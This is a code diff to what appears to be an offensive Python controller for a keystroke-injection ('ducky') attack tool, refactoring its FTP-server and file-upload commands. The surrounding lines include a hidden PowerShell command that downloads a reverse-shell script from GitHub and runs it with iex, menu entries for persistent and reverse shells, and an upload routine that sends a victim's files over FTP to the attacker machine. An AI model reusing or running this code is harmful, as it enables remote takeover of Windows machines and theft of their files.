@@ -121,8 +121,9 @@ while not stop:
             print("ducky/persistence    N/A          Set up a persistent shell")
             print("                     -d           Delete the persistent shell")
             print("ducky/reverse_shell  \"ip:port\"    Set up a custom reverse shell")
+            print("ducky/ftp            N/A          Start FTP server on attacker machine")
+            print("                     -q           Close FTP server on attacker machine")
             print("ducky/upload         \"filename\"   Upload a file to attacker machine using FTP")
-            print("                     -q           Close FTP server")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -181,7 +182,7 @@ while not stop:
             commands = []
             commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell).content\'")
             stdin = "; ".join(commands)
-        elif ducky_command[:6] == "upload":
+        elif ducky_command[:3] == "ftp":
             options = [x for x in ducky_command.split(" ")[1:] if x]
             if "-q" in options:
                 stop_ftp = True
@@ -189,14 +190,17 @@ while not stop:
                 stop_ftp = False
                 stdin = ""
             else:
-                filename = options[0]
                 threading.Thread(target=ftp_server).start()
-                commands = []
-                commands.append("out-file -inputobject \"put " + filename + "\" -encoding ascii ftp.txt")
-                commands.append("out-file -inputobject \"quit\" -encoding ascii -append ftp.txt")
-                commands.append("ftp -A -s:ftp.txt " + attacker_ip)
-                commands.append("rm ftp.txt")
-                stdin = "; ".join(commands)
+                stdin = ""
+        elif ducky_command[:6] == "upload":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            filename = options[0]
+            commands = []
+            commands.append("out-file -inputobject \"put " + filename + "\" -encoding ascii ftp.txt")
+            commands.append("out-file -inputobject \"quit\" -encoding ascii -append ftp.txt")
+            commands.append("ftp -A -s:ftp.txt " + attacker_ip)
+            commands.append("rm ftp.txt")
+            stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
